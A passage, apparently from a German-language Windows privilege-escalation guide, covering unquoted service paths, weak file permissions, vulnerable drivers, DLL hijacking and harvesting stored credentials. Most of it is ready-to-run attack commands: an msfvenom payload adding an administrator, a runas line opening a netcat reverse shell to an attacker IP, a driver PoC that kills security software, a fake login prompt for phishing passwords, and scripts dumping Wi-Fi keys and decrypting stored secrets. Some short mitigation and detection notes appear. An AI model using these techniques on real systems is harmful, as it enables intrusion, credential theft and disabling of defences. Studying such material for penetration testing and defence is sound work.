Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, alle möglichen Ausführungsdateien zu starten, die vor einem Leerzeichen enden.

Zum Beispiel wird Windows für den Pfad _C:\Program Files\Some Folder\Service.exe_ versuchen, folgendes auszuführen:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Liste alle unquoted service paths auf, ausgenommen diejenigen, die zu eingebauten Windows-Diensten gehören:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Sie können diese Schwachstelle erkennen und exploiten** mit metasploit: `exploit/windows/local/trusted\_service\_path` Sie können manuell eine Service-Binärdatei mit metasploit erstellen:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Wiederherstellungsaktionen

Windows ermöglicht es Benutzern, Aktionen anzugeben, die ausgeführt werden sollen, falls ein Service fehlschlägt. Diese Funktion kann so konfiguriert werden, dass sie auf ein binary zeigt. Wenn dieses binary ersetzbar ist, könnte privilege escalation möglich sein. Weitere Details finden sich in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installierte Anwendungen

Prüfe die **Berechtigungen der binaries** (vielleicht kannst du eine davon überschreiben und privilege escalation erreichen) und der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Schreibberechtigungen

Prüfe, ob du eine Konfigurationsdatei ändern kannst, um eine bestimmte Datei zu lesen, oder ob du ein binary ändern kannst, das vom Administrator account (schedtasks) ausgeführt wird.

Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, ist:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ lädt jede Plugin-DLL in seinen `plugins`-Unterordnern automatisch. Wenn eine beschreibbare portable oder kopierte Installation vorhanden ist, führt das Ablegen eines bösartigen Plugins bei jedem Start automatisch zur Code-Ausführung innerhalb von `notepad++.exe` (einschließlich aus `DllMain` und plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Systemstart ausführen

**Überprüfe, ob du eine Registry oder Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **autoruns locations to escalate privileges** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **Drittanbieter-, ungewöhnlichen oder verwundbaren** Treibern
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Wenn ein Treiber ein beliebiges Kernel-Lese/Schreib-Primitiv offenlegt (häufig in schlecht gestalteten IOCTL-Handlern), kann man eskalieren, indem man ein SYSTEM-Token direkt aus dem Kernel-Speicher stiehlt. Siehe die Schritt‑für‑Schritt‑Technik hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der verwundbare Aufruf einen vom Angreifer kontrollierten Object Manager-Pfad öffnet, kann das absichtliche Verlangsamen der Suche (durch Verwendung von Komponenten mit maximaler Länge oder tiefen Verzeichnisketten) das Zeitfenster von Mikrosekunden auf einige zehn Mikrosekunden strecken:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry‑Hive: Primitive für Speicherkorruption

Moderne Hive-Schwachstellen ermöglichen es, deterministische Layouts vorzubereiten, beschreibbare HKLM/HKU-Nachkommen zu missbrauchen und Metadatenkorruption in kernel paged-pool overflows umzuwandeln, ohne einen eigenen Treiber. Erfahren Sie die vollständige Kette hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Ausnutzen des fehlenden FILE_DEVICE_SECURE_OPEN bei device objects (LPE + EDR kill)

Einige signierte Third‑Party-Treiber erstellen ihr device object mit einer starken SDDL via IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL nicht durchgesetzt, wenn das device über einen Pfad mit einer zusätzlichen Komponente geöffnet wird, sodass jeder unprivilegierte Benutzer ein Handle erhalten kann, indem er einen Namespace-Pfad wie folgt verwendet:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das device öffnen kann, können privilegierte von dem Treiber exponierte IOCTLs für LPE und Manipulation missbraucht werden. Beispiele für in der Praxis beobachtete Fähigkeiten:
- Vollzugriffs-Handles an beliebige Prozesse zurückgeben (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Beenden beliebiger Prozesse, einschließlich Protected Process/Light (PP/PPL), wodurch AV/EDR aus dem Userland über den Kernel beendet werden können.

Minimales PoC-Muster (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Gegenmaßnahmen für Entwickler
- Setzen Sie immer FILE_DEVICE_SECURE_OPEN, wenn Sie Device-Objekte erstellen, die durch eine DACL eingeschränkt werden sollen.
- Validieren Sie den Aufruferkontext für privilegierte Operationen. Fügen Sie PP/PPL-Prüfungen hinzu, bevor Sie Prozessbeendigungen oder das Zurückgeben von Handles erlauben.
- Beschränken Sie IOCTLs (access masks, METHOD_*, Eingabevalidierung) und erwägen Sie vermittelte Modelle statt direkter Kernel-Privilegien.

Erkennungsansätze für Verteidiger
- Überwachen Sie user-mode-Öffnungen von verdächtigen Device-Namen (z. B., \\ .\\amsdk*) und spezifische IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Setzen Sie Microsofts vulnerable driver blocklist durch (HVCI/WDAC/Smart App Control) und pflegen Sie eigene Allow/Deny-Listen.


## PATH DLL Hijacking

Wenn Sie **write permissions inside a folder present on PATH** haben, könnten Sie eine von einem Prozess geladene DLL hijacken und dadurch **escalate privileges**.

Prüfen Sie die Berechtigungen aller Ordner innerhalb von PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Weitere Informationen darüber, wie man diese Prüfung ausnutzen kann:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Netzwerk

### Freigaben
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts-Datei

Prüfe die hosts-Datei auf andere bekannte Computer, die dort hartkodiert sind.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netzwerkschnittstellen & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

Prüfe von außen auf **restricted services**
```bash
netstat -ano #Opened ports?
```
### Routingtabelle
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-Tabelle
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-Regeln

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Mehr[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die Binärdatei `bash.exe` befindet sich außerdem unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Wenn du root-Rechte erhältst, kannst du auf jedem Port lauschen (das erste Mal, wenn du `nc.exe` benutzt, um auf einem Port zu lauschen, fragt die GUI, ob `nc` von der Firewall zugelassen werden soll).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Um bash einfach als root zu starten, können Sie `--default-user root` verwenden

Sie können das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` erkunden

## Windows Zugangsdaten

### Winlogon-Anmeldeinformationen
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Der Windows Vault speichert Benutzeranmeldedaten für Server, Websites und andere Programme, bei denen **Windows** die Benutzer **automatisch anmelden** kann. Auf den ersten Blick könnte es so aussehen, als könnten Benutzer ihre Facebook-, Twitter- oder Gmail-Anmeldedaten usw. speichern, damit sie sich automatisch in Browsern anmelden. Das ist jedoch nicht der Fall.

Windows Vault speichert Anmeldedaten, mit denen Windows Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldedaten benötigt, um auf eine Ressource zuzugreifen** (Server oder eine Website), **diesen Credential Manager** & Windows Vault nutzen kann und die bereitgestellten Anmeldedaten verwendet, anstatt dass Benutzer ständig Benutzername und Passwort eingeben müssen.

Sofern die Anwendungen nicht mit dem Credential Manager interagieren, halte ich es für unwahrscheinlich, dass sie die Anmeldedaten für eine bestimmte Ressource verwenden können. Wenn Ihre Anwendung also den Vault nutzen möchte, sollte sie auf irgendeine Weise **mit dem credential manager kommunizieren und die Anmeldedaten für diese Ressource** aus dem Standard-Speichervault anfordern.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dann können Sie `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldeinformationen zu nutzen. Das folgende Beispiel ruft ein remote binary über ein SMB share auf.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verwendung von `runas` mit einem bereitgestellten Satz von Anmeldeinformationen.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Beachte, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), oder das [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) verwendet werden können.

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten, die überwiegend im Windows-Betriebssystem zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet wird. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, das wesentlich zur Entropie beiträgt.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln durch einen symmetrischen Schlüssel, der aus den Login-Geheimnissen des Benutzers abgeleitet wird**. In Szenarien mit Systemverschlüsselung verwendet es die Domain-Authentifizierungsgeheimnisse des Systems.

Verschlüsselte Benutzer-RSA-Schlüssel werden mittels DPAPI im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers darstellt. **Der DPAPI-Schlüssel, der zusammen mit dem Master-Schlüssel, der die privaten Schlüssel des Benutzers in derselben Datei schützt, abgelegt ist**, besteht typischerweise aus 64 Bytes zufälliger Daten. (Es ist wichtig zu beachten, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist, sodass dessen Inhalte nicht mit dem `dir`-Befehl in CMD aufgelistet werden können, jedoch über PowerShell aufgelistet werden können).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Sie können das **mimikatz module** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **credentials files protected by the master password** befinden sich normalerweise in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Du kannst das **mimikatz module** `dpapi::cred` mit dem passenden `/masterkey` verwenden, um zu entschlüsseln.\
Du kannst viele DPAPI-Masterkeys aus dem **Speicher** mit dem `sekurlsa::dpapi`-Modul extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-Anmeldeinformationen

**PowerShell credentials** werden oft für **Scripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Zugangsdaten bequem zu speichern. Die Anmeldeinformationen werden mit **DPAPI** geschützt, was typischerweise bedeutet, dass sie nur vom selben Benutzer auf demselben Computer, auf dem sie erstellt wurden, entschlüsselt werden können.

Um eine PS-Anmeldeinformation aus der Datei, die sie enthält, zu entschlüsseln, kannst du folgendes tun:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gespeicherte RDP-Verbindungen

Sie finden sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
und in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Zuletzt ausgeführte Befehle
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remotedesktop-Anmeldeinformationsverwaltung**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Verwende das **Mimikatz** `dpapi::rdg` Modul mit dem passenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\
Mit dem Mimikatz `sekurlsa::dpapi` Modul kann man **viele DPAPI masterkeys** aus dem Speicher extrahieren

### Sticky Notes

Viele nutzen die StickyNotes-App auf Windows-Arbeitsstationen, um **Passwörter zu speichern** und andere Informationen, ohne zu merken, dass es sich um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und es lohnt sich immer, danach zu suchen und sie zu untersuchen.

### AppCmd.exe

**Beachte, dass zum Wiederherstellen von Passwörtern aus AppCmd.exe Administratorrechte erforderlich sind und der Prozess unter einer hohen Integritätsstufe ausgeführt werden muss.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\ 
Wenn diese Datei existiert, ist es möglich, dass einige **credentials** konfiguriert wurden und **wiederhergestellt** werden können.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Überprüfe, ob `C:\Windows\CCM\SCClient.exe` existiert.\
Installer werden **mit SYSTEM-Rechten ausgeführt**, viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dateien und Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host-Schlüssel
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in der Registry

SSH private keys können im Registry-Schlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert werden, daher solltest du prüfen, ob sich dort etwas Interessantes befindet:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Wenn Sie einen Eintrag in diesem Pfad finden, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er ist verschlüsselt gespeichert, kann aber leicht mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) entschlüsselt werden.\
Weitere Informationen zu dieser Technik finden Sie hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Wenn der `ssh-agent`-Dienst nicht läuft und Sie möchten, dass er beim Systemstart automatisch startet, führen Sie aus:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Es sieht so aus, als wäre diese Technik nicht mehr gültig. Ich habe versucht, einige ssh keys zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per ssh an einer Maschine anzumelden. Die registry HKCU\Software\OpenSSH\Agent\Keys existiert nicht und procmon hat während der asymmetrischen Schlüssel-Authentifizierung nicht die Verwendung von `dpapi.dll` identifiziert.

### Unbeaufsichtigte Dateien
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Du kannst diese Dateien auch mit **metasploit** durchsuchen: _post/windows/gather/enum_unattend_

Beispielinhalt:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM- & SYSTEM-Sicherungen
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud-Zugangsdaten
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Früher gab es eine Funktion, mit der benutzerdefinierte lokale Administrator-Konten über Group Policy Preferences (GPP) auf einer Gruppe von Rechnern bereitgestellt werden konnten. Diese Methode wies jedoch erhebliche Sicherheitsmängel auf. Erstens konnten die Group Policy Objects (GPOs), die als XML-Dateien in SYSVOL gespeichert sind, von jedem Domänenbenutzer eingesehen werden. Zweitens konnten die Passwörter innerhalb dieser GPPs, die mit AES256 unter Verwendung eines öffentlich dokumentierten Standard-Schlüssels verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein ernstes Risiko dar, da es Benutzern ermöglichen konnte, erhöhte Rechte zu erlangen.

Zur Minderung dieses Risikos wurde eine Funktion entwickelt, die nach lokal zwischengespeicherten GPP-Dateien sucht, die ein nicht leeres "cpassword"-Feld enthalten. Beim Auffinden einer solchen Datei entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zur GPP und zum Speicherort der Datei und unterstützt so bei der Identifizierung und Behebung dieser Sicherheitslücke.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor Windows Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Zum Entschlüsseln des cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Verwendung von crackmapexec, um die passwords zu erhalten:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Beispiel einer web.config mit Anmeldeinformationen:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN Zugangsdaten
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Protokolle
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Nach credentials fragen

Du kannst immer **den Benutzer auffordern, seine credentials einzugeben oder sogar die credentials eines anderen Benutzers**, wenn du denkst, dass er sie kennen könnte (beachte, dass **das direkte Fragen** des **Clients** nach den **credentials** wirklich **riskant** ist):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mögliche Dateinamen, die credentials enthalten**

Bekannte Dateien, die vor einiger Zeit **passwords** im **clear-text** oder **Base64** enthielten
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
